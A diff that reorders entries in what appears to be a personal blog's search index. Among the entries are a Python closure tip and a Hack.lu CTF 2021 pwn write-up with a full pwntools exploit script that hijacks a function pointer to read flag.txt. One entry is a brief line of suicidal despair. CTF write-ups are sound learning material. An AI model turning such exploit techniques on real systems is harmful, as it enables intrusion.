@@ -104,6 +104,26 @@
       </tags>
   </entry>
   <entry>
+    <title>Wired Python lambda scope (lambda closure)</title>
+    <url>/2021/09/21/wired-python-lambda-scope-lambda-closure/</url>
+    <content><![CDATA[<p>think of this two code</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">powers = [<span class="keyword">lambda</span> x: x**i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br><span class="line"><span class="built_in">print</span>(powers[<span class="number">3</span>](<span class="number">2</span>))</span><br><span class="line">powers1 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">	powers1.append(<span class="keyword">lambda</span> x:x**i)</span><br><span class="line"><span class="built_in">print</span>(powers1[<span class="number">3</span>](<span class="number">2</span>))</span><br></pre></td></tr></table></figure>
+
+<p>What do you expect the result.</p>
+<span id="more"></span>
+<p>The result is 512 and 512.  Not 8 and 8</p>
+<p>The reason is lambda didn’t evaluate i immediately.</p>
+<blockquote>
+<p>Python’s closures are late binding. This means that the values of variables used in closures are looked up at the time the inner function is called.</p>
+</blockquote>
+<p>ref: <a href="https://docs.python-guide.org/writing/gotchas/#late-binding-closures">https://docs.python-guide.org/writing/gotchas/#late-binding-closures</a></p>
+<p>the correct implementation should be</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">powers = [<span class="keyword">lambda</span> x,j=i: x**j <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br><span class="line"><span class="built_in">print</span>(powers[<span class="number">3</span>](<span class="number">2</span>))</span><br><span class="line">powers1 = []</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span>(<span class="params">i</span>):</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">b</span>(<span class="params">x</span>):</span></span><br><span class="line">		<span class="keyword">return</span> x**i</span><br><span class="line">	<span class="keyword">return</span> b </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">	powers1.append(a(i))</span><br><span class="line"><span class="built_in">print</span>(powers1[<span class="number">3</span>](<span class="number">2</span>))</span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Debugging binary with pwntools and radare2</title>
     <url>/2021/10/18/debugging-binary-with-pwntools-and-radare2/</url>
     <content><![CDATA[<h1 id="Brief"><a href="#Brief" class="headerlink" title="Brief"></a>Brief</h1><p>When using radare2 debugger, How to deal with the user input when debugging? There are two simple method.</p>
@@ -262,26 +282,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Wired Python lambda scope (lambda closure)</title>
-    <url>/2021/09/21/wired-python-lambda-scope-lambda-closure/</url>
-    <content><![CDATA[<p>think of this two code</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">powers = [<span class="keyword">lambda</span> x: x**i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br><span class="line"><span class="built_in">print</span>(powers[<span class="number">3</span>](<span class="number">2</span>))</span><br><span class="line">powers1 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">	powers1.append(<span class="keyword">lambda</span> x:x**i)</span><br><span class="line"><span class="built_in">print</span>(powers1[<span class="number">3</span>](<span class="number">2</span>))</span><br></pre></td></tr></table></figure>
-
-<p>What do you expect the result.</p>
-<span id="more"></span>
-<p>The result is 512 and 512.  Not 8 and 8</p>
-<p>The reason is lambda didn’t evaluate i immediately.</p>
-<blockquote>
-<p>Python’s closures are late binding. This means that the values of variables used in closures are looked up at the time the inner function is called.</p>
-</blockquote>
-<p>ref: <a href="https://docs.python-guide.org/writing/gotchas/#late-binding-closures">https://docs.python-guide.org/writing/gotchas/#late-binding-closures</a></p>
-<p>the correct implementation should be</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">powers = [<span class="keyword">lambda</span> x,j=i: x**j <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br><span class="line"><span class="built_in">print</span>(powers[<span class="number">3</span>](<span class="number">2</span>))</span><br><span class="line">powers1 = []</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span>(<span class="params">i</span>):</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">b</span>(<span class="params">x</span>):</span></span><br><span class="line">		<span class="keyword">return</span> x**i</span><br><span class="line">	<span class="keyword">return</span> b </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">	powers1.append(a(i))</span><br><span class="line"><span class="built_in">print</span>(powers1[<span class="number">3</span>](<span class="number">2</span>))</span><br></pre></td></tr></table></figure>]]></content>
-      <tags>
-        <tag>python</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>别在图书馆秀恩爱</title>
     <url>/2021/10/04/bie-zai-tu-shu-guan-xiu-en-ai/</url>
     <content><![CDATA[<p>我真是服了，图书馆里能不能好好学习，别秀恩爱了，要秀去房间里秀，给我整吐了。</p>
@@ -304,12 +304,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>活着好累</title>
-    <url>/2021/03/23/huo-zhao-hao-lei/</url>
-    <content><![CDATA[<p>活着好累，要是能死就好了</p>
-]]></content>
-  </entry>
-  <entry>
     <title>自制新插件添加~</title>
     <url>/2020/11/25/zi-zhi-cha-jian-tian-jia/</url>
     <content><![CDATA[<p>大概自己做了一个小插件</p>
@@ -324,6 +318,12 @@
 <li><code>git clone https://github.com/LXG-Shadow/hexo-background-plus</code></li>
 <li>打开package.json,<br> 在dependencies中添加<code>&quot;hexo-background-plus&quot;:&quot;^0.0.1&quot;</code></li>
 </ol>
+]]></content>
+  </entry>
+  <entry>
+    <title>活着好累</title>
+    <url>/2021/03/23/huo-zhao-hao-lei/</url>
+    <content><![CDATA[<p>活着好累，要是能死就好了</p>
 ]]></content>
   </entry>
   <entry>
@@ -863,19 +863,6 @@ alter table fingerprints drop partition p20
       </tags>
   </entry>
   <entry>
-    <title>Add tag system</title>
-    <url>/2019/05/20/blogarchive/2019-05-20-10-08-26/</url>
-    <content><![CDATA[<p>In May 20, 2019. I add a tag system into the blog.</p>
-<p>To use the tag, click add article or edit article, in the edit page, you will see  a new tag input.</p>
-<p>type tags into the input and split them with space</p>
-<p>e.g “mysql python” means two tag: mysql and python.</p>
-<p>click submit to finish.</p>
-]]></content>
-      <categories>
-        <category>SiteDev</category>
-      </categories>
-  </entry>
-  <entry>
     <title>Problem about install windows 10 in mac os with bootcamp.</title>
     <url>/2019/04/17/blogarchive/2019-04-17-16-43-23/</url>
     <content><![CDATA[<p><strong>problem 1</strong>: stuck at “partition disk”.</p>
@@ -906,6 +893,19 @@ alter table fingerprints drop partition p20
       <tags>
         <tag>macos</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>Add tag system</title>
+    <url>/2019/05/20/blogarchive/2019-05-20-10-08-26/</url>
+    <content><![CDATA[<p>In May 20, 2019. I add a tag system into the blog.</p>
+<p>To use the tag, click add article or edit article, in the edit page, you will see  a new tag input.</p>
+<p>type tags into the input and split them with space</p>
+<p>e.g “mysql python” means two tag: mysql and python.</p>
+<p>click submit to finish.</p>
+]]></content>
+      <categories>
+        <category>SiteDev</category>
+      </categories>
   </entry>
   <entry>
     <title>Use single-user-mode to access files from a mac without login</title>
@@ -1304,15 +1304,6 @@ server {
       </tags>
   </entry>
   <entry>
-    <title>utf-8 乱码表</title>
-    <url>/2019/09/06/blogarchive/2019-09-06-10-34-25/</url>
-    <content><![CDATA[<p><img src="/images/20201124847.png" alt="utf 乱码表"></p>
-]]></content>
-      <categories>
-        <category>Programming</category>
-      </categories>
-  </entry>
-  <entry>
     <title>add cdn for live2d models</title>
     <url>/2019/09/16/blogarchive/2019-09-16-22-32-00/</url>
     <content><![CDATA[<p>add cdn for live2d models</p>
@@ -1320,6 +1311,15 @@ server {
 ]]></content>
       <categories>
         <category>SiteDev</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>utf-8 乱码表</title>
+    <url>/2019/09/06/blogarchive/2019-09-06-10-34-25/</url>
+    <content><![CDATA[<p><img src="/images/20201124847.png" alt="utf 乱码表"></p>
+]]></content>
+      <categories>
+        <category>Programming</category>
       </categories>
   </entry>
   <entry>
@@ -2374,6 +2374,45 @@ https://www.bsfdvbsbilibili.com
       </tags>
   </entry>
   <entry>
+    <title>【Hack.lu CTF 2021】secure prototype 【pwn】</title>
+    <url>/2021/10/31/ctfwriteup/hackerluctf2021/hacker-lu-2021-secure-prototype/</url>
+    <content><![CDATA[<h1 id="0x1-introduction"><a href="#0x1-introduction" class="headerlink" title="0x1 introduction"></a>0x1 introduction</h1><p><a href="https://flu.xxx/challenges/16">https://flu.xxx/challenges/16</a></p>
+<h1 id="0x3-Mitigations"><a href="#0x3-Mitigations" class="headerlink" title="0x3 Mitigations"></a>0x3 Mitigations</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Arch:     arm-32-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    Canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      No PIE (0x10000)</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x3-Solution"><a href="#0x3-Solution" class="headerlink" title="0x3 Solution"></a>0x3 Solution</h1><p>challenge contains 3 file, challenge.elf, stonks.txt, flag.txt</p>
+<p>using decompiler and take a deep look at functions.</p>
+<span id="more"></span>
+
+<p><img src="/2021/10/31/ctfwriteup/hackerluctf2021/hacker-lu-2021-secure-prototype/2021-10-31_151419.jpg" alt="2021-10-31_151419.jpg"></p>
+<p>after enter the correct command and enter three variable, it will jump to function at 108e0, 108e0 contains a switch that call different function depending on the command user enter.</p>
+<p><img src="/2021/10/31/ctfwriteup/hackerluctf2021/hacker-lu-2021-secure-prototype/2021-10-31_151832.jpg" alt="2021-10-31_151832.jpg"></p>
+<p>notice that string “stonks.txt” are stored in the <code>byte_22058</code>, and with commmand <em>48</em>, function <code>sub_10B80</code> will read <code>byte_22058</code> as a filename, and print out whether in the file.</p>
+<p>so, we got an idea that if we need get the flag, we need to change <code>byte_22058</code> to “flag.txt” instead of “stonks.txt”</p>
+<p>looking at other commands, command <em>1056</em> allow us pass a integer as a pointer to an function (lets say <strong>funcA</strong>).</p>
+<p>and with command <em>4619</em>, we have call <strong>funcA</strong> with our 1st and 2nd parameter.</p>
+<p>so, here is the question. Is there any function that take 2 pointer parameter and can modify a string. </p>
+<p>the answer is <code>plt:00010570 __isoc99_scanf</code>, we can use <code>scanf(&quot;%s&quot;,char* str)</code> to read input from stdin and write str.</p>
+<p>in this case, str is the address of <code>byte_22058</code>, and “%s” can also found in the data section.</p>
+<p>therefore, we have the process of getting the flag.</p>
+<ol>
+<li>use 1056: change function address to scanf</li>
+<li>use 4619: call scanf and write flag.txt to byte_22058</li>
+<li>use 48: print out the file content in filename(byte_22058)</li>
+</ol>
+<h1 id="0x4-exp-py"><a href="#0x4-exp-py" class="headerlink" title="0x4 exp.py"></a>0x4 exp.py</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># This exploit template was generated via:</span><br><span class="line"># $ pwn template &#x27;--host=flu.xxx&#x27; &#x27;--port=20040&#x27; challenge.elf</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># Set up pwntools for the correct architecture</span><br><span class="line">exe = context.binary = ELF(&#x27;challenge.elf&#x27;)</span><br><span class="line"></span><br><span class="line"># Many built-in settings can be controlled on the command-line and show up</span><br><span class="line"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span><br><span class="line"># for all created processes...</span><br><span class="line"># ./exploit.py DEBUG NOASLR</span><br><span class="line"># ./exploit.py GDB HOST=example.com PORT=4141</span><br><span class="line">host = args.HOST or &#x27;flu.xxx&#x27;</span><br><span class="line">port = int(args.PORT or 20040)</span><br><span class="line"></span><br><span class="line">def start_local(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span><br><span class="line">    if args.GDB:</span><br><span class="line">        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line">def start_remote(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span><br><span class="line">    io = connect(host, port)</span><br><span class="line">    if args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    return io</span><br><span class="line"></span><br><span class="line">def start(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        return start_local(argv, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"># Specify your GDB script here for debugging</span><br><span class="line"># GDB will be launched if the exploit is run via e.g.</span><br><span class="line"># ./exploit.py GDB</span><br><span class="line">gdbscript = &#x27;&#x27;&#x27;</span><br><span class="line">tbreak *0x&#123;exe.entry:x&#125;</span><br><span class="line">continue</span><br><span class="line">&#x27;&#x27;&#x27;.format(**locals())</span><br><span class="line"></span><br><span class="line">#===========================================================</span><br><span class="line">#                    EXPLOIT GOES HERE</span><br><span class="line">#===========================================================</span><br><span class="line"># Arch:     arm-32-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    Canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      No PIE (0x10000)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">print(1,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;1056&quot;)</span><br><span class="line">print(2,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;66928 0 0&quot;)</span><br><span class="line">print(3,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;4919&quot;)</span><br><span class="line">print(4,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;70140 139352 0&quot;)</span><br><span class="line">io.sendline(b&quot;flag.txt\x00&quot;)</span><br><span class="line">print(5,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;48&quot;)</span><br><span class="line">print(6,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;123 456 789&quot;)</span><br><span class="line">print(io.recv())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(&quot;%%s&quot;,0x111fc)</span><br><span class="line">print(&quot;22058&quot;,0x0022058)</span><br><span class="line">print(&quot;scanf&quot;,0x00010570)</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x5-flag"><a href="#0x5-flag" class="headerlink" title="0x5 flag"></a>0x5 flag</h1><p>flag{gl0bal_st0nkz_and_gl0bal_var1abl3}</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>hack.lu</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>[writeup][DownUnderCTF 2021] pwn Leaking like a sieve</title>
     <url>/2021/10/09/ctfwriteup/ductf2021/ductf2021-pwn-leaking-like-a-sieve/</url>
     <content><![CDATA[<h2 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
@@ -2614,45 +2653,6 @@ https://www.bsfdvbsbilibili.com
         <tag>writeup</tag>
         <tag>ductf</tag>
         <tag>ret2libc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>【Hack.lu CTF 2021】secure prototype 【pwn】</title>
-    <url>/2021/10/31/ctfwriteup/hackerluctf2021/hacker-lu-2021-secure-prototype/</url>
-    <content><![CDATA[<h1 id="0x1-introduction"><a href="#0x1-introduction" class="headerlink" title="0x1 introduction"></a>0x1 introduction</h1><p><a href="https://flu.xxx/challenges/16">https://flu.xxx/challenges/16</a></p>
-<h1 id="0x3-Mitigations"><a href="#0x3-Mitigations" class="headerlink" title="0x3 Mitigations"></a>0x3 Mitigations</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Arch:     arm-32-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    Canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      No PIE (0x10000)</span><br></pre></td></tr></table></figure>
-
-<h1 id="0x3-Solution"><a href="#0x3-Solution" class="headerlink" title="0x3 Solution"></a>0x3 Solution</h1><p>challenge contains 3 file, challenge.elf, stonks.txt, flag.txt</p>
-<p>using decompiler and take a deep look at functions.</p>
-<span id="more"></span>
-
-<p><img src="/2021/10/31/ctfwriteup/hackerluctf2021/hacker-lu-2021-secure-prototype/2021-10-31_151419.jpg" alt="2021-10-31_151419.jpg"></p>
-<p>after enter the correct command and enter three variable, it will jump to function at 108e0, 108e0 contains a switch that call different function depending on the command user enter.</p>
-<p><img src="/2021/10/31/ctfwriteup/hackerluctf2021/hacker-lu-2021-secure-prototype/2021-10-31_151832.jpg" alt="2021-10-31_151832.jpg"></p>
-<p>notice that string “stonks.txt” are stored in the <code>byte_22058</code>, and with commmand <em>48</em>, function <code>sub_10B80</code> will read <code>byte_22058</code> as a filename, and print out whether in the file.</p>
-<p>so, we got an idea that if we need get the flag, we need to change <code>byte_22058</code> to “flag.txt” instead of “stonks.txt”</p>
-<p>looking at other commands, command <em>1056</em> allow us pass a integer as a pointer to an function (lets say <strong>funcA</strong>).</p>
-<p>and with command <em>4619</em>, we have call <strong>funcA</strong> with our 1st and 2nd parameter.</p>
-<p>so, here is the question. Is there any function that take 2 pointer parameter and can modify a string. </p>
-<p>the answer is <code>plt:00010570 __isoc99_scanf</code>, we can use <code>scanf(&quot;%s&quot;,char* str)</code> to read input from stdin and write str.</p>
-<p>in this case, str is the address of <code>byte_22058</code>, and “%s” can also found in the data section.</p>
-<p>therefore, we have the process of getting the flag.</p>
-<ol>
-<li>use 1056: change function address to scanf</li>
-<li>use 4619: call scanf and write flag.txt to byte_22058</li>
-<li>use 48: print out the file content in filename(byte_22058)</li>
-</ol>
-<h1 id="0x4-exp-py"><a href="#0x4-exp-py" class="headerlink" title="0x4 exp.py"></a>0x4 exp.py</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># This exploit template was generated via:</span><br><span class="line"># $ pwn template &#x27;--host=flu.xxx&#x27; &#x27;--port=20040&#x27; challenge.elf</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># Set up pwntools for the correct architecture</span><br><span class="line">exe = context.binary = ELF(&#x27;challenge.elf&#x27;)</span><br><span class="line"></span><br><span class="line"># Many built-in settings can be controlled on the command-line and show up</span><br><span class="line"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span><br><span class="line"># for all created processes...</span><br><span class="line"># ./exploit.py DEBUG NOASLR</span><br><span class="line"># ./exploit.py GDB HOST=example.com PORT=4141</span><br><span class="line">host = args.HOST or &#x27;flu.xxx&#x27;</span><br><span class="line">port = int(args.PORT or 20040)</span><br><span class="line"></span><br><span class="line">def start_local(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span><br><span class="line">    if args.GDB:</span><br><span class="line">        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line">def start_remote(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span><br><span class="line">    io = connect(host, port)</span><br><span class="line">    if args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    return io</span><br><span class="line"></span><br><span class="line">def start(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        return start_local(argv, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"># Specify your GDB script here for debugging</span><br><span class="line"># GDB will be launched if the exploit is run via e.g.</span><br><span class="line"># ./exploit.py GDB</span><br><span class="line">gdbscript = &#x27;&#x27;&#x27;</span><br><span class="line">tbreak *0x&#123;exe.entry:x&#125;</span><br><span class="line">continue</span><br><span class="line">&#x27;&#x27;&#x27;.format(**locals())</span><br><span class="line"></span><br><span class="line">#===========================================================</span><br><span class="line">#                    EXPLOIT GOES HERE</span><br><span class="line">#===========================================================</span><br><span class="line"># Arch:     arm-32-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    Canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      No PIE (0x10000)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">print(1,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;1056&quot;)</span><br><span class="line">print(2,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;66928 0 0&quot;)</span><br><span class="line">print(3,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;4919&quot;)</span><br><span class="line">print(4,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;70140 139352 0&quot;)</span><br><span class="line">io.sendline(b&quot;flag.txt\x00&quot;)</span><br><span class="line">print(5,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;48&quot;)</span><br><span class="line">print(6,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;123 456 789&quot;)</span><br><span class="line">print(io.recv())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(&quot;%%s&quot;,0x111fc)</span><br><span class="line">print(&quot;22058&quot;,0x0022058)</span><br><span class="line">print(&quot;scanf&quot;,0x00010570)</span><br></pre></td></tr></table></figure>
-
-<h1 id="0x5-flag"><a href="#0x5-flag" class="headerlink" title="0x5 flag"></a>0x5 flag</h1><p>flag{gl0bal_st0nkz_and_gl0bal_var1abl3}</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>writeup</tag>
-        <tag>hack.lu</tag>
       </tags>
   </entry>
   <entry>
